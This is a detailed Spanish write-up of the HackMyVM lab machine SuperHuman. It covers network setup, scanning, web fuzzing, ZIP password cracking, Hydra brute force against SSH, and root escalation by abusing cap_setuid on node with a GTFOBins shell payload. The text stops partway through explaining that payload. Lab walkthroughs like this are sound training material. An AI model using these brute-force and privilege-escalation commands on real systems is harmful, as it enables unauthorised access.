# Writeup muy detallado - SuperHuman (HackMyVM)

> **Objetivo de este documento**: dejar un writeup extremadamente detallado, paso a paso, explicando no solo **qué** se hizo sino **por qué** se hizo, **qué significa cada salida**, **qué conceptos técnicos hay detrás** y **cómo interpretar cada pista**. La idea es que sirva también como material de estudio para una primera toma de contacto con muchos conceptos de pentesting en entornos tipo CTF/laboratorio.

---

## Índice

1. Introducción y contexto
2. Problema inicial: error al importar en VMware
3. Configuración de red para hacer convivir VMware y VirtualBox
4. Preparación del entorno de trabajo en Kali
5. Descubrimiento de la IP de la víctima con Nmap
6. Identificación de la máquina correcta por MAC y OUI
7. Escaneo completo de puertos y servicios
8. Enumeración web inicial
9. Fuzzing de rutas con Gobuster
10. Análisis de la imagen y metadatos
11. Descubrimiento y decodificación de `notes-tips.txt`
12. Localización del ZIP oculto
13. Extracción del hash del ZIP y cracking con John the Ripper
14. Análisis del poema y generación de diccionario propio
15. Fuerza bruta contra SSH con Hydra
16. Acceso como `fred`
17. Restricción extraña del comando `ls`
18. Concepto de PATH Hijacking explicado bien
19. Búsqueda de vector local sin `sudo`
20. Uso de LinPEAS desde `/tmp`
21. Reparación defensiva del `ls` con un symlink a `dir`
22. Linux Capabilities: explicación profunda
23. Abuso de `cap_setuid` en `/usr/bin/node`
24. Escalada a root
25. Recuperación de `root.txt`
26. Resumen técnico del ataque
27. Conceptos importantes aprendidos

---

## 1. Introducción y contexto

La máquina que vamos a resolver es **SuperHuman**, de la plataforma **HackMyVM**.

El objetivo de la máquina es comprometer el sistema paso a paso hasta obtener acceso inicial, escalar privilegios y recuperar las flags correspondientes.

En este caso, además del propio proceso de explotación, hay una parte previa importante: **la virtualización y la conectividad entre máquinas virtuales**. Eso hay que dejarlo bien explicado porque, si la red está mal montada, ni siquiera podremos empezar la enumeración.

---

## 2. Problema inicial: error al importar en VMware

Al intentar importar la máquina en VMware aparece un error.

![Imagen 1 - Error al importar en VMware](files/imagen1_error_vmware.png)

Como la importación en VMware falla, optamos por abrir la máquina víctima en **VirtualBox**. Sin embargo, nuestra Kali ya la tenemos en **VMware**, así que ahora aparece un problema nuevo:

- la víctima vive en VirtualBox,
- la atacante vive en VMware,
- y ambas necesitan verse entre sí en red.

Eso obliga a configurar las dos máquinas para que queden en la **misma red física**, usando modo **puente**.

---

## 3. Configuración de red para hacer convivir VMware y VirtualBox

### 3.1. Configuración en VirtualBox

Importamos la máquina en VirtualBox y vamos a:

**Configuración > Red > Adaptador 1 > Conectado a: Adaptador puente**

En el desplegable de **Nombre** seleccionamos el adaptador que aparece en la siguiente imagen:

![Imagen 2 - Adaptador elegido en VirtualBox](files/imagen2_adaptador_virtualbox.png)

### ¿Por qué elegimos ese adaptador exactamente?

Porque ese es el **adaptador de red físico real** del host Windows que nos da conectividad a la red doméstica o corporativa. En este caso es la interfaz Wi‑Fi:

**MediaTek Wi‑Fi 6 MT7921 Wireless LAN Card**

Eso significa que la máquina virtual se conectará **como si fuera otro equipo más de la red real**.

No estará aislada en una red privada interna de VirtualBox, ni en una red NAT propia del hipervisor. En vez de eso:

- la VM pedirá una IP a la misma red donde está el host,
- aparecerá como otro dispositivo más en el router,
- y podrá hablar con otros dispositivos de esa red, incluida la Kali si la configuramos igual.

### Qué significa “Adaptador puente”

El modo **bridge** o **adaptador puente** hace que la VM quede conectada directamente a la red física.

En la práctica, el sistema invitado se comporta como si tuviera su propia tarjeta de red enchufada al router.

Eso implica varias cosas:

- la VM recibe una IP de la red real,
- tiene visibilidad de otros equipos de esa red,
- otros equipos pueden verla a ella,
- el tráfico ya no va solo por una red privada del hipervisor.

### Diferencia con NAT

En modo **NAT**, la VM sale a internet a través del host, pero normalmente queda más aislada y no siempre es visible cómodamente desde otras VMs en otros hipervisores.

Aquí no nos interesa NAT. Aquí nos interesa que **Kali y la víctima se vean directamente**, aunque estén montadas con productos distintos.

---

### 3.2. Configuración en VMware

Ahora vamos a la Kali en VMware y ajustamos también su red para que use **el mismo adaptador físico real**.

Ruta:

**VMware > Editar > Editor de red virtual > VMnet bridged > seleccionar el mismo adaptador**

![Imagen 3 - Configuración de VMnet en VMware](files/imagen3_vmware_vmnet_puente.png)

### ¿Por qué hay que escoger el mismo adaptador que en VirtualBox?

Porque si en VirtualBox ponemos un puente hacia la Wi‑Fi real, pero en VMware el puente apunta a otro adaptador diferente, las máquinas podrían quedar en segmentos distintos, o una de ellas ni siquiera tener acceso correcto.

Queremos que ambas salgan por el **mismo camino de red**.

Es decir:

- VirtualBox puentea a la interfaz Wi‑Fi real.
- VMware también puentea a esa misma interfaz Wi‑Fi real.

Así ambas máquinas terminan coexistiendo en la **misma subred física**.

---

### 3.3. Configuración final en la propia Kali

Dentro de la configuración de la VM Kali en VMware vamos a:

**Click derecho sobre la máquina > Configuración > Adaptador de red > Conexión de red > Conexión en puente**

![Imagen 4 - Kali en modo puente](files/imagen4_kali_puente.png)

### ¿Por qué este paso también es necesario?

Porque una cosa es cómo está definido el **VMnet** globalmente en VMware, y otra cómo está configurada **esa VM concreta**.

Si la Kali siguiera usando NAT, aunque el editor de redes esté preparado para puente, esa VM seguiría saliendo por NAT. Por eso hay que asegurarse de que **la máquina concreta** está usando **Bridged**.

---

### 3.4. Cambio de IP en la Kali

Al aplicar la configuración de puente, es normal que la red de la Kali se reinicie un momento. La interfaz se desconecta y vuelve a levantar con una IP nueva asignada por la red real.

Podemos comprobarlo con:

```bash
ip a
```

Y vemos algo como esto:

![Imagen 5 - Nueva IP de Kali](files/imagen5_ip_kali.png)

La IP relevante es:

```text
inet 192.168.1.42/24
```

Eso significa que la Kali ahora está en la red `192.168.1.0/24`, concretamente con la IP `192.168.1.42`.

### Qué significa `/24`

La notación `/24` indica la máscara de red, equivalente a `255.255.255.0`.

Eso quiere decir que la red cubre las direcciones:

- `192.168.1.0` → identificador de red
- `192.168.1.1` a `192.168.1.254` → hosts potenciales
- `192.168.1.255` → broadcast

Así que un escaneo sobre `192.168.1.42/24` realmente está escaneando toda la subred `192.168.1.0/24`.

---

## 4. Preparación del entorno de trabajo en Kali

Creamos una carpeta específica para ordenar el trabajo:

```bash
cd ~/Desktop
cd HackMyVM
mkdir SuperHuman
cd SuperHuman
```

Quedamos en:

```bash
~/Desktop/HackMyVM/SuperHuman
```

Esto es importante por orden operativo. Durante una resolución vamos a generar muchos artefactos:

- escaneos de Nmap,
- archivos descargados,
- hashes,
- diccionarios,
- notas,
- scripts,
- salidas de herramientas.

Si no se organiza desde el principio, luego cuesta mucho reconstruir el proceso.

---

## 5. Descubrimiento de la IP de la víctima con Nmap

Como ya sabemos la IP de Kali (`192.168.1.42`) y sabemos que estamos en la red `192.168.1.0/24`, hacemos descubrimiento de hosts:

```bash
sudo nmap -n -sn 192.168.1.42/24
```

### Explicación de las flags

#### `sudo`
Nmap necesita privilegios elevados para ciertos tipos de escaneo, especialmente descubrimiento de hosts con determinados paquetes o ciertas técnicas de bajo nivel.

#### `nmap`
Herramienta de enumeración de red. Sirve para descubrir hosts, puertos, servicios, versiones y, en ocasiones, características del sistema remoto.

#### `-n`
Indica a Nmap que **no resuelva DNS**.

Esto evita que convierta IPs a nombres de host. Acelera el proceso y evita ruido innecesario.

#### `-sn`
Significa **Ping Scan** o **Host Discovery Only**.

Le dice a Nmap que **no haga escaneo de puertos**. Solo quiere saber qué equipos están vivos.

#### `192.168.1.42/24`
Es la red a escanear. Aunque hemos escrito una IP concreta (`192.168.1.42`), el `/24` hace que Nmap interprete la **subred completa**.

---

### Salida obtenida

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-21 16:26 EDT
Nmap scan report for 192.168.1.1
Host is up (0.0043s latency).
MAC Address: DC:08:DA:84:39:30 (Unknown)
Nmap scan report for 192.168.1.33
Host is up (0.000092s latency).
MAC Address: 48:E7:DA:42:B4:AD (AzureWave Technology)
Nmap scan report for 192.168.1.34
Host is up (0.30s latency).
MAC Address: 6A:88:E4:FB:4A:51 (Unknown)
Nmap scan report for 192.168.1.35
Host is up (0.19s latency).
MAC Address: 3A:08:50:20:7B:8C (Unknown)
Nmap scan report for 192.168.1.37
Host is up (0.29s latency).
MAC Address: 3C:BD:3E:C6:86:31 (Beijing Xiaomi Electronics)
Nmap scan report for 192.168.1.40
Host is up (0.00018s latency).
MAC Address: 08:00:27:12:9F:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.1.41
Host is up (0.20s latency).
MAC Address: DE:2B:B7:7C:1C:E7 (Unknown)
Nmap scan report for 192.168.1.90
Host is up (0.0028s latency).
MAC Address: 44:3B:14:F0:E3:A8 (Unknown)
Nmap scan report for 192.168.1.200
Host is up (0.085s latency).
MAC Address: A4:43:8C:A3:71:3F (Arris Group)
Nmap scan report for 192.168.1.42
Host is up.
Nmap done: 256 IP addresses (10 hosts up) scanned in 5.98 seconds
```

---

## 6. Identificación de la máquina correcta por MAC y OUI

Aquí aparece algo importante: salen **muchas IPs** vivas.

### ¿Por qué ahora salen muchas IPs?

Porque ya no estamos en una red privada aislada del hipervisor.

Antes, cuando se trabaja en una red interna de VMware, es normal ver pocas máquinas y que muchas correspondan a adaptadores virtuales de VMware.

Ahora estamos usando **adaptador puente**, así que estamos viendo la **red física real**. Eso incluye:

- el router,
- el host Windows,
- móviles,
- dispositivos IoT,
- otros portátiles,
- la Kali,
- y la VM víctima.

Por eso aparecen varios hosts distintos.

---

### Cómo identificar cuál es la víctima

La pista clave está en la MAC:

```text
192.168.1.40
MAC Address: 08:00:27:12:9F:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

### ¿Por qué esta es la máquina de VirtualBox?

Porque el prefijo MAC `08:00:27` corresponde al OUI utilizado por Oracle VirtualBox.

### Qué es un OUI

**OUI** significa **Organizationally Unique Identifier**.

Es el prefijo inicial de una dirección MAC, asignado a un fabricante.

La MAC completa identifica una interfaz de red concreta, pero los primeros 3 bytes suelen identificar **al fabricante**.

Ejemplos importantes:

- `08:00:27` → VirtualBox
- `00:0C:29` → VMware
- `48:E7:DA` → AzureWave
- `A4:43:8C` → Arris

### Conclusión

La víctima es:

```text
192.168.1.40
```

### Aclaración importante sobre la IP

En tu texto aparece una pequeña contradicción en un punto donde se menciona `192.168.1.41`, pero por la salida del escaneo la máquina correcta es **192.168.1.40**, que es la que muestra la MAC de VirtualBox.

Así que seguimos con `192.168.1.40`.

---

## 7. Escaneo completo de puertos y servicios

Ahora hacemos un escaneo más agresivo para ver puertos abiertos, versiones y scripts básicos:

```bash
sudo nmap -p- --open -sCV -Pn -T5 -vvv -oN fullscan 192.168.1.40
```

### Explicación de cada flag

#### `-p-`
Escanea **todos los puertos TCP**, del 1 al 65535.

Sin esto, Nmap suele escanear un conjunto limitado de puertos comunes. Con `-p-` no dejamos fuera nada por defecto.

#### `--open`
Muestra solo los puertos abiertos.

Eso limpia bastante la salida y evita ruido de puertos cerrados.

#### `-sC`
Ejecuta el conjunto de **scripts por defecto** de NSE (Nmap Scripting Engine).

Sirve para recoger información útil como:

- títulos HTTP,
- métodos permitidos,
- hostkeys SSH,
- banners,
- pequeños indicios de configuración.

#### `-sV`
Intenta detectar la **versión del servicio** que corre en cada puerto.

No basta con saber que hay HTTP o SSH; interesa también saber qué software exacto responde.

#### `-Pn`
Le dice a Nmap que **no haga comprobación previa de host activo**.

Asume que el host está vivo y va directamente al escaneo.

Esto es útil cuando:

- el host bloquea ciertos pings,
- hay firewalls,
- o ya sabemos que el equipo está encendido.

#### `-T5`
Plantilla temporal muy agresiva.

Hace el escaneo más rápido, pero también más ruidoso y a veces menos fiable en redes inestables.

En laboratorio suele usarse sin demasiado problema.

#### `-vvv`
Modo muy verbose.

Aumenta el detalle de salida para ver mejor qué va haciendo Nmap.

#### `-oN fullscan`
Guarda la salida en formato normal legible en un archivo llamado `fullscan`.

Esto es muy recomendable para no perder el resultado.

---

### Salida obtenida

```text
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:12:9F:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Con más detalle:

- **Puerto 22** abierto → SSH
- **Puerto 80** abierto → HTTP
- TTL 64 → muy compatible con sistemas Linux
- versiones encajan con **Debian 10**

---

## 8. Enumeración web inicial

Abrimos el puerto 80 en el navegador:

```text
http://192.168.1.40
```

Y la página aparece prácticamente **en blanco**.

Esto es una situación muy típica en laboratorios: una web aparentemente vacía que esconde pistas en:

- el código fuente,
- comentarios HTML,
- archivos estáticos,
- rutas no enlazadas,
- recursos auxiliares.

### Ver el código fuente

Hacemos `Ctrl+U` y encontramos esto:

```html
<img src="index_fichiers/nietzsche.jpg"
```

Eso indica que la página sí tiene contenido, aunque visualmente no esté mostrando casi nada útil aparte de una imagen.

Si accedemos a esa ruta encontramos la imagen siguiente:

![Imagen 6 - Imagen encontrada en la web](files/imagen6_nietzsche.jpg)

La guardamos localmente porque podría contener una pista, bien visible o bien oculta.

---

## 9. Fuzzing de rutas con Gobuster

Como la portada no da mucha información, probamos a descubrir rutas ocultas.

### Primer escaneo

```bash
gobuster dir -u http://192.168.1.40 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100
```

### Explicación detallada de las flags

#### `gobuster dir`
Ejecuta Gobuster en modo **directory enumeration**.

Eso significa que va a probar palabras de un diccionario para construir rutas web y ver cuáles existen.

#### `-u http://192.168.1.40`
Indica la URL objetivo base.

#### `-w /usr/share/wordlists/dirb/big.txt`
Usa ese fichero como diccionario de palabras.

Cada línea del diccionario será probada como posible ruta.

#### `-x html,php,txt`
Además de probar directorios, también prueba archivos con esas extensiones.

Por ejemplo, para una palabra como `admin`, Gobuster puede probar:

- `/admin`
- `/admin.html`
- `/admin.php`
- `/admin.txt`

Esto es muy útil porque muchas pistas no están en directorios sino en archivos sueltos.

#### `-t 100`
Número de hilos concurrentes.

Hace 100 peticiones paralelas, acelerando mucho el proceso. En entornos frágiles puede dar problemas, pero en laboratorio suele ser aceptable.

---

### Resultado del primer diccionario

```text
/.htaccess.txt        (Status: 403)
/.htaccess.php        (Status: 403)
/.htaccess.html       (Status: 403)
/.htaccess            (Status: 403)
/.htpasswd.html       (Status: 403)
/.htpasswd.php        (Status: 403)
/.htpasswd            (Status: 403)
/.htpasswd.txt        (Status: 403)
/index.html           (Status: 200)
/server-status        (Status: 403)
```

### Interpretación

- Los `403` en `.htaccess`, `.htpasswd` o `server-status` no significan necesariamente que podamos leerlos, pero sí que **existen o están protegidos**.
- `/index.html` ya sabíamos que existe.
- No sale nada especialmente valioso todavía.

---

### Segundo escaneo con otro diccionario

Probamos con una wordlist más amplia o distinta:

```bash
gobuster dir -u http://192.168.1.40 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -x html,php,txt -t 100
```

### Resultado relevante

```text
/index.html           (Status: 200)
/server-status        (Status: 403)
/notes-tips.txt       (Status: 200)
/logitech-quickcam_...[truncado]...html (Status: 403)
```

La ruta que nos interesa es:

```text
/notes-tips.txt
```

Esto ya es una pista directa. Un archivo `.txt` suelto suele contener notas, mensajes, credenciales o instrucciones mal expuestas.

---

## 10. Análisis de la imagen y metadatos

Antes de seguir con la nota, comprobamos si la imagen `nietzsche.jpg` esconde algo.

### Exiftool

Usamos:

```bash
exiftool nietzsche.jpg
```

### Qué hace Exiftool

`exiftool` sirve para leer, modificar y borrar metadatos de archivos.

Los metadatos son información adicional sobre un archivo, por ejemplo:

- fecha de creación,
- software usado,
- autor,
- cámara,
- comentarios,
- coordenadas GPS,
- miniaturas incrustadas,
- perfiles de color.

En CTFs, a veces los metadatos esconden pistas.

En este caso, **no devuelve nada útil**.

### Strings

También probamos `strings`, que extrae secuencias de texto legibles de un archivo binario:

```bash
strings nietzsche.jpg
```

Tampoco aparece nada interesante.

### Conclusión

La imagen, al menos por esta vía, no aporta una pista directa. Seguimos con la ruta encontrada por Gobuster.

---

## 11. Descubrimiento y decodificación de `notes-tips.txt`

Abrimos en el navegador:

```text
http://192.168.1.40/notes-tips.txt
```

Y aparece una cadena rara:

```text
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC/g+jUD'3nBEb-A+De'u)F!,")@:UuC/g(Km+CoM$DJL@Q+Dbb6ATDi7De:+g@<HBpDImi@/hSb!FDl(?A9)g1CERG3Cb?i%-Z!TAGB.D>AKYYtEZed5E,T<)+CT.u+EM4--Z!TAA7]grEb-A1AM,)s-Z!TADIIBn+DGp?F(&m'D.R'_DId*=59NN?A8c?5F<G@:Dg*f@$:u@WF`VXIDJsV>AoD^&ATT&:D]j+0G%De1F<G"0A0>i6F<G!7B5_^!+D#e>ASuR'Df-\,ARf.kF(HIc+CoD.-ZgJE@<Q3)D09?%+EMXCEa`Tl/c
```

A simple vista no parece texto plano. Tiene pinta de:

- texto codificado,
- o transformado con un esquema como Base85 / Ascii85,
- no de base64 normal.

### Uso de CyberChef

Vamos a **CyberChef**, una herramienta extremadamente útil para análisis y transformación de datos:

```text
https://gchq.github.io/CyberChef/
```

### Qué es CyberChef

CyberChef es una especie de “cuchillo suizo” para:

- decodificar texto,
- aplicar operaciones encadenadas,
- transformar datos,
- convertir bases,
- analizar binarios,
- calcular hashes,
- descomprimir,
- parsear estructuras.

Lo bueno es que muchas veces detecta automáticamente patrones razonables.

### Qué hacemos aquí

Pegamos la cadena en **Input** y usamos la varita mágica para que sugiera una operación adecuada.

La detección correcta es **From Base85**.

### Resultado

```text
salome doesn't want me, I'm so sad... i'm sure god is dead...
I drank 6 liters of Paulaner.... too drunk lol. I'll write her a poem and she'll desire me. I'll name it salome_and_?? I don't know.

I must not forget to save it and put a good extension because I don't have much storage.
```

### Traducción aproximada

```text
Salomé no me quiere, estoy muy triste... estoy seguro de que Dios ha muerto...
Me bebí 6 litros de Paulaner... estoy demasiado borracho jajaja. Le escribiré un poema y hará que me desee. Lo llamaré salome_and_??, no lo sé.

No debo olvidar guardarlo y ponerle una buena extensión porque no tengo mucho almacenamiento.
```

---

## 12. Localización del ZIP oculto

Aquí hay varias pistas muy buenas:

1. aparece la cadena `salome_and_??`
2. se menciona que hay que ponerle **una buena extensión**
3. se habla de **poco almacenamiento**, lo que sugiere compresión

Eso apunta bastante a un archivo comprimido tipo `.zip`.

Una hipótesis razonable es:

```text
salome_and_me.zip
```

Probamos directamente en el navegador:

```text
http://192.168.1.40/salome_and_me.zip
```

Y efectivamente se descarga el archivo.

Lo movemos a nuestra carpeta de trabajo:

```bash
mv ~/Downloads/salome_and_me.zip .
```

---

## 13. Extracción del hash del ZIP y cracking con John the Ripper

Intentamos descomprimir:

```bash
unzip salome_and_me.zip
```

Y pide contraseña.

### Qué significa esto

El contenido del ZIP está cifrado/protegido con password. No podemos ver directamente el texto interno.

Aquí entra en juego `zip2john`.

### Qué es `zip2john`

Es una utilidad del ecosistema de **John the Ripper** que sirve para extraer de un ZIP protegido el material necesario para realizar cracking offline.

No te da la contraseña en claro. Lo que hace es transformar la protección del ZIP en un formato de hash que John pueda atacar.

### Uso

```bash
zip2john salome_and_me.zip > hash
```

Ahora el archivo `hash` contiene la representación del ZIP protegida en formato que John entiende.

### Crackeo con John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Explicación

#### `john`
Herramienta clásica de cracking de hashes.

#### `--wordlist=/usr/share/wordlists/rockyou.txt`
Usa el famoso diccionario RockYou, que contiene millones de contraseñas reales filtradas.

#### `hash`
Archivo con el hash extraído del ZIP.

### Resultado

```text
turtle           (salome_and_me.zip/salome_and_me.txt)
```

La contraseña es:

```text
turtle
```

### Descomprimir ya con la contraseña

```bash
unzip salome_and_me.zip
```

Introducimos `turtle` y se extrae `salome_and_me.txt`.

---

## 14. Análisis del poema y generación de diccionario propio

Leemos el contenido:

```bash
cat salome_and_me.txt
```

Contenido:

```text
GREAT POEM FOR SALOME

My name is fred,
And tonight I'm sad, lonely and scared,
Because my love Salome prefers schopenhauer, asshole,
I hate him he's stupid, ugly and a peephole,
My darling I offered you a great switch,
And now you reject my love, bitch
I don't give a fuck, I'll go with another lady,
And she'll call me BABY!
```

### Qué interpretamos de aquí

Aparecen nombres propios:

- `fred`
- `Salome`
- `schopenhauer`

En máquinas tipo CTF, los poemas, notas y mensajes personales suelen esconder:

- usuarios,
- contraseñas,
- pistas temáticas.

La intuición razonable aquí es pensar que **fred** podría ser un usuario real del sistema, y que palabras del poema podrían formar parte de su contraseña.

---

### Crear un diccionario a partir del poema

Usamos:

```bash
cat salome_and_me.txt | tr -s '[:space:][:punct:]' '\n' | sort -u > contraseña.txt
```

### Explicación detallada

#### `cat salome_and_me.txt`
Muestra el contenido del archivo.

#### `|`
Tubería. Envía la salida del primer comando como entrada del siguiente.

#### `tr -s '[:space:][:punct:]' '\n'`
`tr` transforma caracteres.

- `[:space:]` = espacios, tabs, saltos de línea
- `[:punct:]` = signos de puntuación, comas, puntos, comillas, etc.
- `\n` = los reemplaza por salto de línea
- `-s` = comprime repeticiones para evitar líneas vacías múltiples

Esto rompe el poema en palabras sueltas.

#### `sort -u`
Ordena las palabras y elimina duplicados.

#### `> contraseña.txt`
Guarda el resultado en un archivo.

### Qué conseguimos con esto

Creamos un **diccionario personalizado**, mucho más afinado que un ataque ciego enorme. Estamos aprovechando el contexto de la máquina.

---

## 15. Fuerza bruta contra SSH con Hydra

Ahora probamos si el usuario `fred` existe en SSH y si su contraseña está entre las palabras del poema.

```bash
hydra -l fred -P contraseña.txt 192.168.1.40 ssh
```

### Explicación de Hydra

Hydra es una herramienta de fuerza bruta para servicios de autenticación.

Puede atacar protocolos como:

- SSH
- FTP
- HTTP(s)
- SMB
- RDP
- Telnet
- POP3
- IMAP
- entre otros

### Explicación de las flags

#### `-l fred`
Login único a probar: `fred`.

#### `-P contraseña.txt`
Lista de contraseñas a probar, una por línea.

#### `192.168.1.40`
Host objetivo.

#### `ssh`
Servicio contra el que se intenta autenticación.

### Resultado

```text
[22][ssh] host: 192.168.1.40   login: fred   password: schopenhauer
```

Eso confirma:

- existe el usuario `fred`
- la contraseña es `schopenhauer`

---

## 16. Acceso como `fred`

Entramos por SSH:

```bash
ssh fred@192.168.1.40
```

Introducimos la contraseña:

```text
schopenhauer
```

Y ya estamos dentro.

Comprobaciones básicas:

```bash
whoami
pwd
```

Resultado:

- usuario: `fred`
- directorio actual: `/home/fred`

Hasta aquí ya tenemos **acceso inicial**.

---

## 17. Restricción extraña del comando `ls`

Al intentar listar archivos:

```bash
ls
```

ocurre algo raro: la conexión se corta.

Sin embargo, con `dir` sí obtenemos salida:

```bash
dir
```

Y con eso vemos:

```text
cmd.txt  user.txt
```

También podemos usar:

```bash
echo *
echo .*
```

### Leer la primera flag

```bash
cat user.txt
```

Contenido:

```text
Ineedmorepower
```

### Nota útil: si no tuviéramos `cat`

A veces puedes leer archivos con:

```bash
grep "" archivo
```

### ¿Por qué funciona `grep "" archivo`?

Porque la expresión vacía `""` coincide con todas las líneas. Entonces `grep` imprime el archivo completo línea por línea, actuando como una especie de lector alternativo.

No siempre sustituye a `cat` en todos los escenarios, pero es muy útil cuando `cat` no está disponible o está restringido.

---

### Leer `cmd.txt`

```bash
cat cmd.txt
```

Contenido:

```text
"ls" command has a new name ?!! WTF !
```

Esto ya no es casualidad. Está indicando que `ls` ha sido modificado o secuestrado de algún modo.

---

## 18. Concepto de PATH Hijacking explicado bien

### Qué hace el sistema cuando escribes un comando

Cuando escribes:

```bash
ls
```

el shell necesita encontrar qué ejecutable corresponde a ese nombre.

Para eso consulta la variable de entorno:

```bash
echo $PATH
```

Por ejemplo, podría tener algo como:

```text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

El shell busca en ese orden. En cuanto encuentra un ejecutable con ese nombre, lo usa.

---

### Qué es un PATH Hijacking

Un PATH hijacking es una técnica en la que se consigue que el sistema ejecute **otro binario distinto** al que el usuario esperaba, aprovechando el orden de búsqueda del `PATH`.

Ejemplo conceptual:

Si en el PATH aparece primero un directorio controlado por ti:

```text
/home/fred/bin:/usr/bin:/bin
```

Y tú creas:

```bash
echo 'malicioso' > /home/fred/bin/ls
chmod +x /home/fred/bin/ls
```

Entonces, al escribir `ls`, el shell encontrará **tu** `ls` antes que el legítimo.

---

### Qué parece pasar aquí

Aquí parece que el comando `ls` ha sido alterado o sustituido por algo que provoca el cierre de sesión o algún comportamiento intencionadamente molesto.

No necesariamente sabemos todavía cómo se ha implementado, pero sí sabemos que:

- `ls` no se comporta normal,
- `dir` sí funciona,
- hay que evitar depender del `ls` estándar.

---

## 19. Búsqueda de vector local sin `sudo`

Probamos:

```bash
sudo -l
```

Y obtenemos:

```text
-bash: sudo: command not found
```

Esto es interesante.

No significa solo que no tengamos permisos. Significa que **ni siquiera existe el comando `sudo` en el PATH accesible** o no está instalado.

Por tanto, no podemos basarnos en la típica vía de enumeración con `sudo -l`.

Tenemos que buscar otras superficies locales, y una de las mejores candidatas en Linux moderno son las **capabilities**.

---

## 20. Uso de LinPEAS desde `/tmp`

Como el entorno de `fred` está algo saboteado o limitado, creamos un directorio de trabajo temporal:

```bash
mkdir /tmp/safe_bin
cd /tmp/safe_bin
```

### ¿Por qué `/tmp`?

Porque normalmente:

- es escribible por usuarios sin privilegios,
- no hace falta ser root,
- no molesta en rutas sensibles del sistema,
- sirve como zona temporal de trabajo.

---

### Servir LinPEAS desde Kali

En la Kali:

```bash
cd /usr/share/peass/linpeas
python3 -m http.server 90
```

### Qué hace ese comando

#### `python3 -m http.server 90`
Levanta un servidor HTTP simple con Python en el puerto 90.

- `python3` → intérprete Python
- `-m` → ejecuta un módulo como script
- `http.server` → módulo que sirve archivos por HTTP
- `90` → puerto elegido

Así cualquier máquina que pueda alcanzar nuestra Kali podrá descargar archivos desde esa carpeta.

---

### Descargar LinPEAS en la víctima

En la máquina comprometida:

```bash
wget http://192.168.1.42:90/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Explicación

#### `wget URL`
Descarga un archivo desde una URL.

#### `chmod +x linpeas.sh`
Da permiso de ejecución al script.

#### `./linpeas.sh`
Lo ejecuta desde el directorio actual.

### Qué analiza LinPEAS

LinPEAS busca muchísimas vías de escalada, entre ellas:

- SUIDs peligrosos
- binarios con capabilities
- cron jobs
- permisos raros
- credenciales expuestas
- servicios internos
- configuraciones inseguras
- posibilidades de PATH hijacking
- montajes extraños
- binarios interesantes

---

## 21. Reparación defensiva del `ls` con un symlink a `dir`

Como `ls` está roto o saboteado, hacemos un bypass “defensivo”:

```bash
ln -s /usr/bin/dir /tmp/safe_bin/ls
export PATH=/tmp/safe_bin:$PATH
```

### Qué hace exactamente `ln -s /usr/bin/dir /tmp/safe_bin/ls`

Crea un **enlace simbólico** llamado `ls` en `/tmp/safe_bin`, que en realidad apunta a `/usr/bin/dir`.

Es decir:

```text
/tmp/safe_bin/ls  --->  /usr/bin/dir
```

### ¿Por qué `dir`?

Porque `dir` muestra listados de archivos y aquí sí funciona. Es una alternativa funcional a `ls`.

### ¿Qué consigue `export PATH=/tmp/safe_bin:$PATH`?

Prependemos `/tmp/safe_bin` al principio del PATH. Así, cuando escribamos `ls`, el shell buscará primero en `/tmp/safe_bin` y encontrará nuestro enlace simbólico.

En la práctica, ahora:

```bash
ls
```

termina ejecutando:

```bash
/usr/bin/dir
```

### Por qué esto es útil

No estamos explotando el PATH hijacking contra otro proceso. Lo estamos usando para **reparar** nuestro propio entorno y evitar el binario secuestrado.

---

## 22. Linux Capabilities: explicación profunda

LinPEAS reporta algo muy importante:

```text
/usr/bin/ping = cap_net_raw+ep
/usr/bin/node = cap_setuid+ep
```

### Qué son las Linux Capabilities

Las capabilities son un mecanismo del kernel Linux para **dividir** el enorme poder de root en permisos más pequeños y específicos.

En vez de decir “este proceso es root o no lo es”, Linux puede otorgar privilegios concretos como:

- abrir puertos bajos,
- enviar paquetes crudos,
- montar sistemas,
- cambiar UIDs,
- saltar permisos DAC,
- etc.

Esto permite que ciertos programas tengan solo el privilegio exacto que necesitan, sin darles todos los privilegios de root.

### Ejemplo: `ping`

`ping` necesita enviar paquetes ICMP. Eso tradicionalmente requería root.

Por eso a menudo tiene:

```text
cap_net_raw
```

Eso es razonable y no necesariamente un fallo.

---

### El caso peligroso: `/usr/bin/node = cap_setuid+ep`

Esto sí es crítico.

#### Qué hace `cap_setuid`

Permite que un proceso cambie su UID efectivo.

Y eso incluye poder hacer:

- `setuid(0)` → pasar a UID 0
- UID 0 = root

### Traducción directa

Si un binario controlable por el usuario tiene `cap_setuid`, existe la posibilidad de que **ese binario pueda convertirse en root**.

Y si además ese binario permite ejecutar código arbitrario, el escenario es ideal para una escalada.

### Por qué Node.js es especialmente peligroso aquí

Porque Node permite ejecutar JavaScript arbitrario desde línea de comandos con `-e`.

Eso significa que no solo tenemos un binario con capacidad peligrosa. Tenemos un binario con capacidad peligrosa **y** que además nos deja programar su comportamiento al momento.

Eso es prácticamente una invitación a escalar.

---

## 23. Abuso de `cap_setuid` en `/usr/bin/node`

Una forma muy conocida de explotar esto aparece también en GTFOBins.

### Qué es GTFOBins

GTFOBins es una base de datos de binarios legítimos de Unix/Linux con ejemplos de abuso para:

- escalada de privilegios,
- bypass de restricciones,
- ejecución de comandos,
- persistencia,
- lectura/escritura de archivos,
- escapes de shells restringidas.

En este caso, buscar `node` en GTFOBins da una técnica de escalada cuando el binario tiene capacidades suficientes.

---

### Payload usado

```bash
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

### Explicación detallada del payload

#### `node -e '...'`
